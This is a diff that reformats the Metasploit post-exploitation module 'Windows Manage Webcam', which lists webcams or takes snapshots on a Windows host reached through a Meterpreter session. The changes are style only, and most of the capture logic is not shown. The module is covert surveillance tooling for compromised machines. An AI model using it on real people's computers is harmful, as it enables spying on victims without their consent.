@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,35 +8,33 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Manage Webcam',
-      'Description'   => %q{
-          This module will allow the user to detect installed webcams (with
-          the LIST action) or take a snapshot (with the SNAPSHOT) action.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'win'],
-      'SessionTypes'  => [ "meterpreter" ],
-      'Actions'       =>
-        [
-          [ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
-          [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ]
-        ],
-      'DefaultAction' => 'LIST'
-    ))
+                      'Name'          => 'Windows Manage Webcam',
+                      'Description'   => %q{
+                          This module will allow the user to detect installed webcams (with
+                          the LIST action) or take a snapshot (with the SNAPSHOT) action.
+                      },
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'sinn3r'],
+                      'Platform'      => [ 'win'],
+                      'SessionTypes'  => [ "meterpreter" ],
+                      'Actions'       =>
+                        [
+                          [ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
+                          [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ]
+                        ],
+                      'DefaultAction' => 'LIST'))
 
     register_options(
       [
         OptInt.new('INDEX',   [false, 'The index of the webcam to use', 1]),
         OptInt.new('QUALITY', [false, 'The JPEG image quality', 50])
-      ], self.class)
+      ], self.class
+    )
   end
-
 
   def run
     if client.nil?
@@ -43,7 +42,7 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    if not action
+    unless action
       print_error("Invalid action")
       return
     end
@@ -56,11 +55,9 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
   def rhost
     client.sock.peerhost
   end
-
 
   def snapshot
     webcams = list_webcams
@@ -70,8 +67,8 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    if not webcams[datastore['INDEX']-1]
-      print_error("#{rhost} - No such index: #{datastore['INDEX'].to_s}")
+    unless webcams[datastore['INDEX'] - 1]
+      print_error("#{rhost} - No such index: #{datastore['INDEX']}")
       return
     end
 
@@ -105,8 +102,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
-  def list_webcams(show=false)
+  def list_webcams(show = false)
     begin
       webcams = client.webcam.webcam_list
     rescue Rex::Post::Meterpreter::RequestError
@@ -121,14 +117,12 @@ class MetasploitModule < Msf::Post
       )
 
       webcams.each_with_index do |name, indx|
-        tbl <<  [(indx+1).to_s, name]
+        tbl << [(indx + 1).to_s, name]
       end
 
       print_line(tbl.to_s)
     end
 
-    return webcams
+    webcams
   end
-
 end
-
